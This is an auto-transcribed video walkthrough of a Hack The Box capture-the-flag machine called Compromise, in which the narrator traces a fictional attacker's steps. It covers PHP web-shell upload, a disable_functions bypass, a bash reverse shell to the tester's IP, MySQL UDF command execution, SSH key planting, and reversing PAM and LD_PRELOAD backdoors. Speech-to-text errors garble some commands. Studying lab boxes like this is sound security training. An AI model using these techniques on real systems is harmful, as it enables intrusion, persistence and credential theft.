 what's going on youtube this is ipsec i'm doing compromise from hack the box which i really like this box because the author put in a lot of work to make it true to its name the idea of the box is you're coming in after a hacker and have to find out what he did by explaining the web app and then kind of tracing his steps the blue team did some minor security things like put some php disabled functions and they believe they broke his ability to get onto the box so we'll do this box two different ways because again the author put in a lot of work he didn't just put one persistence technique he put two because no hacker would ever really just do one persistence they always lay multiple ones so the blue team never knows if they truly got them off so the very first way we'll do the box is through bypassing php disabled functions and then going into a uh pam backdoor which lets you put some skeleton passwords in that let you always authenticate via like ssh or anything the second way will go on the box will live in php we won't bypass disabled functions we'll use a weavely shell to execute stuff in the database and find out the hacker did some minor tweaking and mysql to allow it to execute commands so from that php shell we can use sql to execute a command to let us on the box by dropping an ssh key and then we'll find a ld preload root kit that will reverse and figure out how that ld preload root kit can get us a shell in the box or privesque so with all that being said let's jump in as always we're going to start with the nmap so dash sc for default scripts sv enumerate versions oa output all formats bring the nmap directory and call it compromised and then the ip address which is 10 10 i'm also going to run the nmap with sudo because i'm not root and if you don't do it sometimes it's host identification will fail and you'll just get host as offline also um i've already ran this because it can take some time to run so let's just look at the results and see the ports that are open which is ssh on port 22 and this banner tells us it's an ubuntu box we also have apache on port 80 and it's been tells us in ubuntu box and also that it's an online store selling legitimate rubber ducks so i definitely want to go take this out because that peaked my in curiosity so going to this page we do see light current and indeed it is a rubber duck from acme that is on sale for 19.80 so the very first thing i'm going to do is take a look at this copyright it is a recent copyright so chances are this is dynamically generated or the website is up to date i'm also going to go to github light cart because this sounds like an open source product and i just want to see if there's any files like in the route that may include the version so looking at the readme going down doesn't see that the main thing i'm looking for is like a changelog.md or changelog.txt i don't really see that so i'm going to move on i'm also going to search for git to see if this exists and it doesn't so let's run a go buster on this so we have some type of recon going on in the background so go buster dir mode dash u for url dash w word list and i'm gonna run the raft small words because i just like this word list more um i think the reason why i switched from like um the other one i've done in a lot of videos i forget what it's called um it's in ls user share word list buster then directory list the reason why i switched away from that is because it didn't have like dot get i believe in it and that was enough to make me say okay this one is out of date let's go for a new one so right now i like wrapped small words dot text for the initial brute force and we'll just send it to the out file go buster.out make sure this runs it looks like it does and right off the bat we see slash backup so let's take a look at what backup is while that runs so go into slash backup we have a.tar.gz and i just noticed um we have this shop directory we probably should run a second go buster in this so what i'm going to do is would go copy a go buster and i'm going to run it again this will be [Music] dot gobuster.shop.out and i'm also going to add the extension php because this is a php web app and now we have both of those go busters running so taking a look at slash let's download that one file so a.tar.gz so i'm going to save the file and then we'll open up a new pane maker downloads and let's move or download a.tar.gz to this directory enter x uh [Music] cx no xjvf that's it a.tera.gz it's not a bzip file uh it's just tara okay so the dot gz was wrong funny i guess no one can type to our commands right the first time it's not just me and looking at lsla we see this dot sh.php file let's take a look at it and it looks like it's just a shell and hence the name of the box compromised chances are maybe we're like coming in after an attacker so let's take a look if this file exists it doesn't and i'm going to go back to my go buster did any finish it has not finished yet um what i want to do is take a look of everything that completed and try sh.php so let's see v2do.txt hunt for sh.php okay so at least we have that down and going more into this what can we do um if this is a post compromise we can identify files that have changed and there's two things um let's see ls full iso i think let's see what this is time style okay so dash dash time style equals full asl what lsla maybe it's just base full iso let's see did i type with something paste get rid of the dollar i must type it something oh it's time dash style so i want to bring this up whenever you do some type of post compromise it's always important to look at how the time stamps and various directories are handled so in this cart it was not um archived up with keeping the entire timestamp only up to the seconds so any file that was modified by the attacker is probably going to have this populated and if you ever see two files with the same exact time stamp that is suspicious because this is super duper in depth i mean i think it's like deck a second then centi then millie then micro then nano then pico then femto then addo then zepto so i think this is a zeptosecond maybe i miscounted one and it goes all the way to yakdo but it's a very small measurement of time so like if you did like let's just go up one directory echo t two one and echo t two and we do this time stamp we can see oh uh these are the same let's see echo t to three that go t to four does the time stamp ever change it doesn't um i think that's something my bash is doing um all i'm trying to say is these timestamps are relatively unique because it goes super in-depth uh example failed but i think on windows you'd see that different thing all right see it differently anyways let's just uh carry on and we'll do the next common thing and just find the latest files modified so i'm going to do find dot print f and this is going to let me change like change like the order of everything being displayed so we'll do fine dot dash print f percent t this is going to be for time stamp and then we want to add p and this is going to be the file name or path p stands for path and then i'm going to add a line break after that because if i don't it doesn't put the line break in so this is like modifying each entry so now that i have this just printing the timestamp and then the file name i can send that command over to sort and let's also say dash type is f for file and this will let us sort for files recently modified so we can see that sh.php was dropped at 205 and then around five and a half hours later or actually days later or months later 0509 uh we have these two files being modified admin login.php and include so let's take a look at admin login.php and i'm just going to like the bottom and the top to see if anything sticks out and we do we have this log file so i'm going to grep file put on that file and we're going to hunt for this file it's probably gonna be in um admin so if we do slash shop en is it slop shop admin i think because that's the directory it's in and then it began with a period we get a username and password so that was pretty easy let's try ssh into the box so sh admin at 10 10 10 207 paste the password and we don't get in if we go back to light current we could see if there's any potential usernames so if we click on like a duck do we see who listed it we don't see anything of that sort if this was like a blog or something then potentially but we don't have anything so let's just go back to shop admin and try logging in with these credentials and it looks like they work and we got a note here saying your account was previously used by another location or host name kali-pentest.fireshroud.home so chances are um some hacker got into our system we also have dot ht access is protected and is our go buster finished it is so before we move on let us um use fluff real quick so go buster out let's grab v403 oh there's only two files so we could try shop sh.php if we wanted to to see if that existed wait did that just exist um it looks like it does exist but we're not getting any output um let's see go into downloads shop ls or cat.sh.php it should be doing request cmd so if i do question mark cmd equals who am i nothing happens so looks like this shell is dead if we go to search point and search for light current we have this light curt file upload so i'm going to look at this with search point and this is probably something we should have done at the very beginning and looked at it um admin login page admin password admin username and let's see i guess we can just run it so pi uh search point dash m to mirror it and then python four five two six uh mechanized pip3 install mechanize to install this it's already installed uh oh this is python 2 isn't it less four five two six seven print yeah this is a python 2 app so instead of dealing with python 2 dependencies i'm going to uh examine how this works and we'll try to do it manually so let's see user agent so it goes to the login form and then it goes to this url [Music] uh did i copy my clipboard it did not i'll open up in less and after so i can copy copying vim to clipboard is just a pain so it looks like once it goes to this url it's uploading something so we have upload here and it's putting this php web shell and it's changing the content type to application xml and then it goes to up one directory view cubemod xml to uh view the file so this is a relatively simple exploit so let's just open this up in less so i can copy it a bit easier uh one day i'll memorize how to copy the clipboard and vim but that day is not today so let's copy and let's go back over here we want to go to shop admin and then we do that question mark to go to this page and we can upload a php web shell so let's go maker upload and we can v shell.php and let's just do system request ipsec like that actually keep it like the attacker did and do cmd that looks good so let's upload this and we also before we upload want to send this over to burp suite my suite is now intercepting so we can go to um home htb compromised upload [Music] change this to be all files shell.php upload burp suite send it over to repeater and we change this from application php to xml send it we get a 302 found and i'm going to turn off burp suite and i want to just go to uh up one directory so we get rid of admin bqmod xml i think show.php and i'm gonna do cmd equals who am i and we get nothing still so the next thing i'm gonna do is let's just do echo hello world upload and it prints so chances are there's some type of php disabled function so i'm going to do php info after this we refresh the page and we can see the config the reason why i did echo first is sometimes php info is actually a disabled function and it doesn't print out so echo is never going to be disabled so i always start with the simplest thing first and that will help me uh we can do system and we can look at all these disabled functions so let's copy this let's go over here uh v disabled.txt paste and we'll convert that to lines and we can see system is disabled through p open shell exact proc a bunch of things are disabled we even have things like mail and put end disabled and file put contents and f right so they're really trying to prevent us from writing a file to the server putting all these disabled functions in as well as executing things we could go to like hack tricks php disable bypass i think will get us there disable functions bypass mod uh that's not what i was looking for let's see disabled functions bypass this is probably it yeah so this is a great page to read and we can do php code exact with these functions that's not like system and things does this go into system this is blocking um bypassing the like open baseder and openbasster and php is just a way to lock a web application in a directory so here's a auto discover script i don't like running auto discovers that's chancrell php capabilities other php functions it doesn't list like um let's see curl exec so it's not listing a list of all the ways to run commands or maybe shell exec shell exec okay yeah it is so exact exec is on the list passthrough password is on the list system shell exec p open proc open is this on the list by default or not to monitor you need a load let's see is this on the list it is on the list and then mail is on the list so you can go through these and see if there's any quick wins doesn't look like there's a quick win so i'm going to go to chancrell so let's do cd up chancro and i'm just going to run python and this application is python 2 as well but thankfully it doesn't have any um weird libraries i need to install so we can work with this i'm going to look at my input so rev.sh and this is just a bash reverse shell and the ip's still the same so let's just do python chain grow architecture is going to be 64-bit input is going to be rev.sh output is if.php and a path to where our uploaded files are let's go back over to php info and let's do ver www.html and it's going to be in this directory so paste that and it said it created the file ip.php so let's take a look at what it looks like very annoyingly we have a long base64 string called hook and i think this is the beginner of an l file that fov let's see the next line is an interpreter which i think this is just a reverse shell so it's doing file print contents chunkrow.so and it's doing a base64 decode of hook which was that super big l file we saw a base64 up there and it's also doing one of acpid.socket interpreter and it's putting the environment chancro so this is the um bash reverse shell it's not actually meterpreter it's just what they call that payload and then we put chancro.so and call mail it's not going to work but i think there's other things to do than mail and then again it's not going to work because put end is on the blacklist we look at that was disabled uh let's see be disabled uh find dot grep disable uh put end as on the disabled function list so this whole thing is blocked but there is one piece i wanted to show you and that's when you mainly want to upload files via the website or burp uh the super easy way to do it would be this um let's do hook 64. so we base64 encode this and we want to put this on one line so w0 and then we're going to x-clip dash selection clipboard so now we just copy that base64 to a clipboard so we can now go into burp suite and paste the base64 then highlight the base64 and you can either press ctrl shift b or right click convert selection base64 decode and now we can upload this chancro.so file here so if we did that and then we go over here and we try to download it chaincrow.sl uh what it should let us download let's see chan rail i type for that there we go you chose to open this file so this is how you would have uploaded files to this server but later on the put end is broken because that's disabled and i don't know a way around this so the without knowing the way around this we can't do the ld preload thing and execute mail which breaks all of this so chancro kind of a rabbit hole i just want to explain why i wasn't using it because all the other like um php bypass functions i always use that application i forget what box it was but i'm sure if you go to ipsec dot rocks you'll find it so let's go back over to hack tricks and let's see module version dependent bypasses so here's one php 7 to 7.4 if we click on that it's from this and if we look at the php version here it's 7.2 so we can try this one so let's copy oh there's a copy button copy and then we will paste send it and we called this what is it shell.php so now if i go to shell.php we have the output of looks like you name let's see you name dash a that is right so now we can change this so request ipsec and let's see if we can get this to run codes ipsec equals who am i uh id we put this in quotes i don't think so request that's not it square r eq u e s t ipsec like that that should work i'm doing something stupid probably and i'm definitely right about doing something stupid i have an unbalanced number of parentheses so i'm going to get rid of that send that run and now we can change the output of our command if i type that right id so now we have changed the output let's send this back over to burp suite proxy intercept is on send this to repeater and this is going to be run command and this can be upload file just trying to stay organized i'm going to change this request method there we go and let's do bash c dash dash i dev tcp 10 10 14 4 9 000 1 and let's copy all this and see so nc lvmp 9001 run it and we don't get a response but we don't get a shell either so something is wrong here um i'm going to do a witch curl curl is on the box curl 10 10 14 4. nc lvnp 80. with sudo and we can't get here either so i'm going to guess there's something with iptables so i'm going to do find slash etsy grep iptable and let's see if we can view roles.v4 cat and let's see the output and or see the output requires the source port to be 22 or 80. so um that's why we can't the default is set to drop up here so if there's not an except then it gets dropped and this related established is what allows our web server to work so i'm going to use my forward shell technique that i've demonstrated a long time ago i haven't really touched in a while so ipsec forward shell let's turn burp sweet off run it and this is something i created i don't know there wasn't really a blog post or anything um about this if you go to ipsec.rocks and type forward shell i explain it in several videos so sirocar is probably the first video i use it at i'm going to call it 4.5 pi set paste let's see we want to change the url so the url is going to be up here to shell.php okay this is going to set the session and i'm just going to search for modify this modify okay this is the payload and i have a node here saying this was last used when i uploaded it for shell shock so that's why we do it in the header so we're going to modify this to be data is equal to uh was it ipsec cmd because we're going to send a post request so request dot post instead of headers we can do data equals data and i think that's all i have to do to do this so if you don't know what this is it creates two files uh two named pipes to be more precise input and output and then uses these to do your shell so when you want to run a command it writes the command to input that the shell will then run the command and write it out to output oh shoot set paste uh why'd i do that copy i'm just yeah i was thinking about pausing the video and redoing it but oh well um it'll be a pretty big mistake to edit in case i didn't like um [Music] like modify everything exactly as i showed in the video and had a typo that's why i don't want to just cut so let's see this sometimes the escape key does not work and it's annoying cmd payload uh this can be oopsec okay headers data equals data as i said escape key doesn't always work there we go so if we do python34.pi id does it work it's probably going through burp suite id run it get the result uh something's not happening let's see what did i screw up so let's unurl and code this so it's running that to this file get oh when i was redoing this i did not change this to post there we go so now we have a interactive session on this box so from here we're taking this whole theme of this being a compromise box and i'm going to look for the prives or persistence of the attacker and that's where at the very beginning this file uh video when i was talking about the timestamps it's going to come in handy so do i have full iso i do in here so in this lib directory um let's see let's not do directories so let's do find dot dash print f percent t plus percent p new line okay let's say type f so just like tar archives debian packages won't have the full timestamp and users should really never go into lib and if as long as users don't go into lib then the time stamps will always be all these zeroes of standard packages so since d package installed this send mail library it didn't put the full time stamp there but if a user edited that or manually put it there anytime you interact with the file system it's going to use the full 32 bits for the timestamp so what we're going to do is a grep v to look for files that don't have that and we can see python python notoriously writes into um lib with pip and when it does so because it's downloading the file and compiling and doing a bunch of things it puts the full timestamps in this so we can then go and ignore python so let's do grep v on xeros or python and really there's very few files that we have to go through um we can see i have a python apache module from crime stoppers on my box that's funny so i found a persistence on my box that i forgot about so yeah always funny so let's go and do the same thing here so find slash lib and i want to paste all this so let's go here copy paste and see what we have so that's not too interesting but we have this dot pam underscore unix.so and pamunix.sl so this one is very interesting it's with a um period i'm also going to run like md5sum in both these files to see if they are the same so let's copy and do it on both of these and the files are the same so it doesn't matter which one we grab so i'm going to cp this to verb www html shop what was it let's go to repeater vq mod xml copy it there and then we're going to download it and analyze what this is pam is the plugable authentication module for linux so if you want to create like a plug-in that happens when you log into a box you do it with pam an example for that would be like two-factor authentication so if you wanted your ub key or something to happen with ssh you'd put a pam module there so if you wanted to do persistence though you can inject malicious things into that login pipeline and do things like back door passwords or copy a user's password elsewhere kind of like we saw the modified php login earlier in this box where they copied all the usernames and passwords of trying to log into the application to a file so it's kind of like that um let's move downloads uh was it dot what oh just pam linux okay there's no pam unix.sl here and we can do opt geeja guidro run and we're gonna analyze this file to see if we can figure it out what its backdoor is so let's close file or we click on this little dragon and then we can press i to import and let's do uh not downloads htb and then the next thing is going to be uh compromised and then downloads pamunix okay analyze it select all shore and let's just wait for this little bottom thing to finish and then we will take a look at it so it's now done and if we click around there's just so much to look at like all these functions like there's not a good known starting point so i'm gonna google uh pam backdoor so i'm just going to go over here pam back door and right off the top pan backdoor github and this is a script that's going to put a backdoor password sounds like what we want to do and this is using the patch command to edit something around line 170 of this file pam unix auth dot c so let's take a look at what function this is uh dot c and there's around line 100 and it's pam sm authenticate so let's take a look in our gaija onto functions and we want to go to pam and that was what pam whoops i think it was sm authenticate here we go and we have it right here and we see this uh variable backdoor so that sounds very ominous we can look at this and let's see the decompiled code where is this backdoor if i just highlight this right here does this go here and highlight it doesn't let's see decompiled output is sometimes hard to read bad username ah right here so we got two pointers or those are not pointers um this looks like just hexadecimal values based upon the addresses they begin with so let's go over to cyber chef and let's put these values in so there's one and here's two and what is it doing with these move move i think it's just adding these two values together so let's go from hex and try logging in so where's my shell let's go to python i'm going to type upgrade which is going to do the pty upgrade for me and if i do su dash paste in the password uh authentication failure so that wasn't it uh this could be an issue with endian so let's do swap endianness and the data format is going to be raw so let's copy this su dash paste this authentication failure so let's disable endian and put it like this su dash paste authentication failure put this ooh could have been the pad incomplete words option su dash paste so let's go back disable pad uh and complete words su dash paste and there we go we are now root of this box so if i go into root we can read root.text so that is one way to do this box but because it's a comp my scenario it was actually has two different um what is it persistence methods and there's a different way we can actually do the initial web shell instead of using my forward shell so let's go back and do this box again from the file upload piece so this time we're not going to use the ford shell and we're also um not going to use the pam backdoor so this should be fun to start things off we're going to go to github and search for a php shell called weavely and we don't have to use weebly but the reason why is it does a lot of things natively in php so the issue we run into is we can't really execute bash but we can use php to do a bunch of other dangerous things and instead of writing all those functions by hand which i think we've done before like reading files getting files and doing those things we can just use weebly and have it do it for us so if we execute it we need to do weavely and then generate and it's going to create a um [Music] launcher for us or i forget what it's called but generate put a password in which is going to be please subscribe and then the file name which will be uh let's do please sub dot php so it generated please sub dot php with password so if we cap this we can grab this file which looks nasty it is definitely obfuscated so let's go back to our upload file and we're going to paste a weavely shell and we're going to name it please sub dot php boom so now we can do uh weavely and then the url so http 101010207 i don't know why i'm typing this when i can copy and paste and avoid typos so let's copy up to here paste please sub dot php and then the password please subscribe bang and now we have a weavely shell so we can do colon help to see everything we can do and we could try things like just um execute php shell sh i think if we don't specify anything shell sh is default so let's see shell sh it's not going to work because it uses system but yeah it fails we can also do like ooh shell su or shell scan but what we want to do is look at things like um let's see file cd where's file read so we can do file read to read files from the system so like file read etsy passwd and it's going to use probably php's file git contents to read this file so we can look at it and one thing is super interesting mysql has been bash as a login shell generally mysql is set to no login because there's no reason for that user to have it and as i say that uh crap mysql okay yeah mysql set to bin false on my machine so i just want to make sure it wasn't like oracle and they expect you to do things on a shell but no my sequel's default should be been false or been no login so that is definitely interesting let's go and try logging into the database so we do have the backup of this so if we want to make it lives easy we could just find dot grep config and here's the config config inc dot php and if we go down let's see db user root and the password is change this we could read this file on the server as well so if we do file read uh for www.html this is going to be shop includes config inc dot php and search for pass here we still have the same password so now in um this we can do what was it there's an sql login so execute query um yeah so sql console and let's see dash h is there help there is dash user root passwd change this and now we are in a sql prompt so we can probably do show databases yep so we can do everything we want um we could go into ecom and select all the users but this is a post compromise thing so i'm going to look at user-defined functions on this box first and we do see there is lib mysql.so if you're curious what this is you can probably google it and you'll find someone talking about how to execute commands with this uh let's see execute command let's see mysql user defined function exu command so there's plenty of things i always like defaulting to hack tricks first to see if it helps uh doesn't look like it's right easy to find there but this blog post should be good with doing it essentially it's a trick around my sequel to have my sequel execute commands normally you can't do it but you create a user-defined function and i think you need root privileges to do it because you have to write a library to disk which is um where is it this and yeah so let's try um select stir select exact cmd id uh we need to do quotes and we can run commands so if we do pwd we are in verlip my sequel and i think that's the um place just going to the passwd file that is his home directory so if we create a dot ssh we should be able to get in and since this is can i still do this okay i'd have to exit but i was going to say since this is a like post comp my scenario um we may just want to check for uh keys so we can probably do exact cmd ls pwd uh we just do lsla sh and nothing is in here so if we can we write something in here so touch dot ssh authorized keys by do the correct spacing uh what let's do make the ssh touch i'm trying to see if we can list a file but weird pwd lsla okay we're only getting the uh very bottom line so head dash one two let's see tail dash one two three so this is a way uh we can read the output or we could probably just base 64-w zero and then we can copy this and let's just go to cyber chef again if you can't tell i love cyber chef i've done this in a few videos recently but we can see all the files here so there's no um like id rsa file that would have a private key so let's create one ourselves so i'm going to go up sh keygen dash f and i'm going to call this uh my sequel i guess no password cat mysql and we want to do the public key so we can copy go back to our shell and we can say echo into dot ssh authorized keys and i'm going to chmod 600 sh authorized keys okay chmod 600 my sequel sh i my sequel my sequel at 10 10 10 207. and now we have logged on to the box as the sql user so we no longer have that uh mysql shell we have a full shell in this box so from here we could go and find that pan back door just like we did before but there's some other things we can do on this box the first being going up to a different user if we just do an ls in this directory we see this s trace log.dat file which is unique normally doesn't exist and it's the output of s trace and again hyping the importance of timestamps we do time style equals full iso and we can see most the files in this have the full 32-bit timestamp however the one the hacker or attacker used does not so he probably used the touch command or something to set this back in time so always always important to understand timestamps as a defender and also as an attacker you may just be standing out and you just don't know it because this is your output and people don't dig into the full time stamp of the file system or on the file system which goes into either zep2 or yocto seconds but yeah so if we look at this output whoops it is the s trace output and s trace is like a syscall trace and there's a pretty cool blog post if you do like poor man keylogger s trace i think yeah this is talking about using s trace as a key logger because when it does that cis dot write to write something to terminal it logs the key so if we grep read on this log file if i do this in a single quote we see them typing things in so here they did pseudo p kill s trace so we can kind of snoop what they did let's see so the password right here change me or change this and they did um what is it t-u-n-a-p-l i don't know what that is oh netstat um i think it was who was it um moose moose told me the funniest thing here instead of doing turn up you can do peanut p-n-u-t but yeah ah shoot i forgot when i was going in i was thinking about netstat flags and just remembering a story but we have my sequel dash you root password and we have this strong password and this is before they did change me oh man that that yellow hurt my eyes and when i got rid of it it went away but we have something here so let's type this out where is it right here so three star and lje two dollar f e let's see what this is so su dash paste doesn't work etsy pass wd su-cis admin paste that was not it maybe i typed it wrong or maybe there's a different password select let's see three stir n l j e three two i dollar f low case e typo let's try this make sure that's in my clipboard i can't see you to root let's try sysadmin and we can uh this user doesn't really have anything i think if we just look at groups he's in his own group so there's nothing really special about this user other than that's where user.txt is we can do everything else from mysql because um it's another like persistence mechanism so if i just do ldd on any file and if you're confused what i'm about to go into it's ld preload if you go to hack the box's youtube channel youtube.com c hack the box and i have a video up here i believe that i'd recommend uh this blue team gameplay with process monitoring i recommend looking into that because i go all into ld preload but there is this file here that is unique libdate.sl that is not a file that's normally on this box so if we look at it whoops lsla let's do timestyle equals full iso and it has a timestamp of what we'd expect and it's back then so um nothing really stands out here if we find percent t let's do lib dash print f percent t plus percent p backslash n and grip for this time stamp does anything come up so it's with everything else so this backdoor actually blended in pretty darn well if it did something to hide itself from the ldd command probably would have a really tough time finding it because it could also edit itself from it's probably and like cats at cld dot so dot com probably or ld dot so dot preload you can also see it there but this could hide itself from this file and also the ldd command if it was a good root kit so let's copy this file so uh copy lib date to be ver www.html uh what is it shop it's like vq yeah vq mod xml now we can't because we're mysql base64 libdate.so w0 and we'll copy it this way i guess i could have scp-ed it copy v lib date.so.b64 paste a64-d so let's md5 summit real quick 99.82 md5 sum 99 82. i just look at the first two and last two if there's match chances are it's the same if they don't then man something like magical happened let's see libdate.sl what there we go analyze select all analyze okay okay so there's only one thing in export and that is this read so this is overwriting the um read library and let's see so upon read it's going to check if two and then all these hex values are in and if they are it's going to set gid and uid and execute a shell if not then it's going to return and probably execute the um system read function right here so let's go over to cyber chef and let's see delete that 0x there we go 77 6 b 6 5 4 f 5 5 3 4 7 3 6 8 7 6 3 8 3 4 six f six b two f i typed that hopefully i didn't type out anything else um i can type it again real quick zero zero x seven seven six b six five four oh my num pad's not on i was like say that doesn't look as long as i thought it was zero x seven seven six b six five four f five five three four seven three six a 7 6 3 8 3 4 6 f 6 b 2 f okay so we can say from hex and remember it starts with a 2 right here so i'm going to copy this and now all we have to do is execute a set uid binary that uses the read function so su does so here it's executing read i'm going to paste the password of that ld preload root kit authentication failure oh i did not do the two and we see it just comes back with a hashtag if i type id we can't see my input output i'm typing env enter and we just see the pwd so i'm going to type export term is equal to xterm and then r-e-c-e-t reset and now our terminal is fixed and we can read root.text so that is the second way to do this box hope you guys enjoyed it take care and i will see you all next week